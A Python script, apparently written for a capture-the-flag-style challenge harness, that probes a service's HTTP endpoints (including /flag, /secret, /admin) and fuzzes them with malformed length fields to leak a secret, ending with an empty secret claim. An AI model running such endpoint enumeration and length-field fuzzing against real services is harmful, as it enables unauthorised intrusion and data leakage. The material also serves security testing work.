import json,sys,base64,collections

def req(method,path,body=None,body_hex=None,headers=None):
    m={"http":{"method":method,"path":path}}
    if body is not None: m["http"]["body"]=body
    if body_hex is not None: m["http"]["body_hex"]=body_hex
    if headers: m["http"]["headers"]=headers
    print(json.dumps(m),flush=True)
    line=sys.stdin.readline()
    if not line: return None
    try: return json.loads(line)
    except Exception: return {"status":-1,"body_b64":""}

ENT=[]
def probe(method,path,body=None,body_hex=None,headers=None,tag=""):
    r=req(method,path,body,body_hex,headers)
    if not r:
        ENT.append({"tag":tag,"m":method,"p":path,"st":"NORESP","ct":None,"body":"","hex":""})
        return None
    b=r.get("body_b64") or ""
    try: raw=base64.b64decode(b)
    except Exception: raw=b.encode('latin-1','replace')
    txt=raw.decode('latin-1')
    ENT.append({"tag":tag,"m":method,"p":path,"st":str(r.get("status")),"ct":r.get("content_type"),"body":txt[:4000],"hex":raw[:600].hex()})
    return r

PATHS=["/","/help","/help/","/README","/readme.txt","/usage","/format","/doc","/docs","/api","/spec","/schema","/health","/status","/info","/version","/ping","/test","/echo","/index.html","/parse","/parser","/record","/records","/record/parse"," /parse-record".strip(),"/upload","/ingest","/decode","/read","/api/parse","/api/record","/process","/handle","/data","/rpc","/query","/search","/debug","/source","/flag","/secret","/admin","/submit","/recv","/packet","/obj","/bin","/robots.txt"]
for p in PATHS:
    probe("GET",p,tag="GET "+p)

live=[]
for e in ENT:
    if e["st"] not in ("404","NORESP"):
        live.append(e["p"])
if not live:
    for p in ["/","/parse","/record","/upload","/decode","/read","/ingest","/api/parse","/process","/data","/rpc"]:
        probe("POST",p,body="",tag="POST0 "+p)
        live.append(p)

CANDS=list(dict.fromkeys(live))
print("LIVE:",CANDS,file=sys.stderr)

JS=['{"length":-1}','{"length":4294967295}','{"length":2147483647}','{"length":-2147483648}','{"length":18446744073709551615}','{"length":9999999999999}','{"len":-1}','{"len":4294967295}','{"size":-1}','{"count":-1}','{"n":-1}','{"num":-1}','{"type":1,"length":-1}','{"records":[{"len":-1}]}','{"length":0,"data":""}']
def pfx(n,size,little):
    return n.to_bytes(size,'little' if little else 'big')
BIN=[]
for n in [0xFFFFFFFF,0x7FFFFFFF,0x80000000,0xFFFFFFF0,0xFFFFFFFE,0x00FFFFFF,0x0000FFFF,0xFF,0x7F,0xFFFFFFFFFFFFFFFF,0xFFFFFFFFFFFFFFFC,0x7FFFFFFFFFFFFFFF]:
    for size in (1,2,4,8):
        if n < (1<<(8*size)):
            for l in (False,True):
                BIN.append(pfx(n,size,l)+b"AAAA")
BIN.append(b"AAAA"+pfx(0xFFFFFFFF,4,False))
BIN.append(b"AAAA"+pfx(0xFFFFFFFF,4,True))
BIN.append(b"\x01\x00\x00\x00"+b"\xff\xff\xff\xff")
TXT=['len=-1','length=-1','LEN=-1','-1\nAAAA','AAAA\n\xff\xff\xff\xff','\xff\xff\xff\xff\nAAAA','{"len":4294967295}']

for p in CANDS:
    for j in JS:
        probe("POST",p,body=j,headers={"Content-Type":"application/json"},tag="PJ "+p+" "+j)
    for rb in BIN:
        probe("POST",p,body_hex=rb.hex(),tag="PB "+p+" "+rb.hex()[:40])
    for t in TXT:
        probe("POST",p,body=t,tag="PT "+p+" "+repr(t)[:40])

try:
    with open("/tmp/p3.json","w") as f: json.dump(ENT,f)
except Exception: pass

def sig(e):
    b=e["body"]
    pr=all(32<=ord(c)<127 or c in "\r\n\t" for c in b)
    s=b if pr else e["hex"]
    return (e["st"],str(e["ct"]),s[:150])
groups=collections.OrderedDict()
for e in ENT:
    groups.setdefault(sig(e),[]).append(e["tag"])
lines=[]
for k,v in groups.items():
    lines.append("### st=%s ct=%s n=%d :: %r || ex: %s"%(k[0],k[1],len(v),k[2]," ; ".join(v[:4])))
print("TOTAL %d groups %d"%(len(ENT),len(lines)),file=sys.stderr)
for l in lines[-40:]:
    print(l,file=sys.stderr,flush=True)
print('CLAIM:{"secret_hex": ""}')